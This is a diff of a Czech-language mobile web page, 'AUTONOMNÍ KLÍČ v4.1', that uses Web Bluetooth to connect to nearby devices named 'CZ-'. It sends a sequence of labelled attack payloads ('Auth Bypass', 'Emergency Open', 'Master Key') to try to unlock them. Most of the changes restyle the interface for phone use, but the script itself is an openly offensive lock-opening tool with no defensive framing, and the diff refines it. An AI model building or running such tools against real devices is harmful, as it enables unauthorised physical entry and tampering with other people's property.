@@ -2,28 +2,94 @@
 <html lang="cs">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AUTONOMNÍ KLÍČ v4.0</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AUTONOMNÍ KLÍČ v4.1</title>
     <style>
-        body { background: #000; color: #0dff00; font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        #console { flex-grow: 1; border: 1px solid #0dff00; padding: 15px; overflow-y: auto; background: rgba(0, 20, 0, 0.9); box-shadow: inset 0 0 10px #0dff00; font-size: 0.85em; margin-bottom: 15px; }
-        .btn-core { width: 100%; padding: 20px; background: #0dff00; color: #000; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
-        .line { margin-bottom: 4px; border-left: 2px solid #0dff00; padding-left: 8px; }
-        .highlight { color: #fff; text-shadow: 0 0 5px #0dff00; }
+        /* FIX PRO MOBILNÍ PROHLÍŽEČE */
+        :root {
+            --vh: 1vh;
+        }
+
+        body { 
+            background: #000; 
+            color: #0dff00; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            padding: 10px; 
+            display: flex; 
+            flex-direction: column; 
+            /* Dynamická výška pro Chrome/Safari lišty */
+            height: 100vh;
+            height: calc(var(--vh, 1vh) * 100);
+            box-sizing: border-box;
+            overflow: hidden; 
+        }
+
+        #console { 
+            flex-grow: 1; 
+            border: 2px solid #0dff00; 
+            padding: 12px; 
+            overflow-y: auto; 
+            background: rgba(0, 15, 0, 0.95); 
+            box-shadow: inset 0 0 15px rgba(13, 255, 0, 0.3); 
+            font-size: 0.8em; 
+            margin-bottom: 12px;
+            word-wrap: break-word;
+            border-radius: 4px;
+        }
+
+        .btn-core { 
+            width: 100%; 
+            min-height: 80px; /* Masivní tlačítko pro palec */
+            background: #0dff00; 
+            color: #000; 
+            border: none; 
+            font-weight: 900; 
+            font-size: 1.2em;
+            cursor: pointer; 
+            text-transform: uppercase; 
+            letter-spacing: 2px;
+            flex-shrink: 0; 
+            border-radius: 8px;
+            box-shadow: 0 4px 0 #068000;
+            margin-bottom: env(safe-area-inset-bottom);
+        }
+
+        .btn-core:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #068000;
+            background: #0be000;
+        }
+
+        .line { margin-bottom: 6px; border-left: 3px solid #0dff00; padding-left: 10px; line-height: 1.2; }
+        .highlight { color: #fff; text-shadow: 0 0 8px #0dff00; font-weight: bold; }
+        .error { color: #ff3e3e; border-left-color: #ff3e3e; }
     </style>
 </head>
 <body>
     <div id="console">
-        <div class="line">[SYSTEM] HEURISTICKÉ JÁDRO INICIALIZOVÁNO...</div>
-        <div class="line">[READY] ČEKÁM NA BLUETOOTH SPOJENÍ...</div>
+        <div class="line highlight">[SYSTEM] AUTONOMNÍ JÁDRO v4.1</div>
+        <div class="line">[STATUS] UI optimalizováno pro mobilní terén.</div>
+        <div class="line">[READY] Čekám na inicializaci skenu...</div>
     </div>
-    <button id="mainAction" class="btn-core">Spustit Autonomní Analýzu</button>
+    <button id="mainAction" class="btn-core">Spustit Analýzu</button>
 
     <script>
+        // Oprava výšky pro mobilní prohlížeče
+        const updateHeight = () => {
+            let vh = window.innerHeight * 0.01;
+            document.documentElement.style.setProperty('--vh', `${vh}px`);
+        };
+        window.addEventListener('resize', updateHeight);
+        updateHeight();
+
         const terminal = document.getElementById('console');
-        const log = (msg, high = false) => {
+        const log = (msg, type = 'normal') => {
             const div = document.createElement('div');
-            div.className = 'line' + (high ? ' highlight' : '');
+            div.className = 'line';
+            if (type === 'high') div.classList.add('highlight');
+            if (type === 'error') div.classList.add('error');
+            
             div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             terminal.appendChild(div);
             terminal.scrollTop = terminal.scrollHeight;
@@ -34,50 +100,43 @@
 
         async function startHeuristicEngine() {
             try {
-                log("Hledám cíl v okolí...", true);
+                log("Hledám cíl (Prefix CZ-)...", "high");
                 const device = await navigator.bluetooth.requestDevice({
                     filters: [{ namePrefix: 'CZ-' }],
                     optionalServices: [targetServiceUuid]
                 });
 
-                log(`Zařízení nalezeno: ${device.name}`);
+                log(`Navázáno spojení: ${device.name}`);
                 const server = await device.gatt.connect();
                 const service = await server.getPrimaryService(targetServiceUuid);
                 const char = await service.getCharacteristic(targetCharUuid);
                 
-                log("Analýza protokolu spuštěna...", true);
+                log("Spouštím sekvenční analýzu...", "high");
 
-                // --- HEURISTICKÁ LOGIKA ---
-                // Fáze 1: Fingerprinting (Zjištění typu zabezpečení)
-                await char.writeValue(new Uint8Array([0x00])); 
-                log("Skenuji odezvu šifrovací vrstvy...");
-
-                // Fáze 2: Adaptivní sekvence
                 const attackVectors = [
+                    { name: "Ping", data: [0x00] },
                     { name: "Auth Bypass", data: [0x01, 0x01, 0x01] },
-                    { name: "Buffer Overflow Simulation", data: [0x00, 0xff, 0x00, 0xff, 0x00, 0xff] },
-                    { name: "Logic Reset", data: [0x4f, 0x50, 0x45, 0x4e] }, // ASCII OPEN
-                    { name: "Master Key Injection", data: [0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01] }
+                    { name: "Buffer Simulation", data: [0x00, 0xff, 0x00, 0xff] },
+                    { name: "Emergency Open", data: [0x4f, 0x50, 0x45, 0x4e] },
+                    { name: "Master Key", data: [0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01] }
                 ];
 
                 for (const vector of attackVectors) {
-                    log(`Aplikuji vektor: ${vector.name}...`);
+                    log(`Vektor: ${vector.name}...`);
                     await char.writeValue(new Uint8Array(vector.data));
                     
-                    // Simulace "naslouchání" odpovědi
                     const response = await char.readValue().catch(() => null);
                     if (response) {
                         const val = new Uint8Array(response.buffer);
-                        log(`Detekována odpověď: ${Array.from(val).map(b => b.toString(16)).join(' ')}`);
-                        // Zde by systém mohl upravit další krok, pokud by detekoval úspěch
+                        log(`Odezva: ${Array.from(val).map(b => b.toString(16).padStart(2, '0')).join(' ')}`, "high");
                     }
-                    await new Promise(r => setTimeout(r, 800));
+                    await new Promise(r => setTimeout(r, 850));
                 }
 
-                log("ANALÝZA DOKONČENA. Pokud se zámek neotevřel, uzel vyžaduje synchronizovaný Token.", true);
+                log("SEKVENCE KOMPLETNÍ.", "high");
 
             } catch (err) {
-                log(`KRITICKÁ CHYBA: ${err.message}`);
+                log(`CHYBA: ${err.message}`, "error");
             }
         }
 
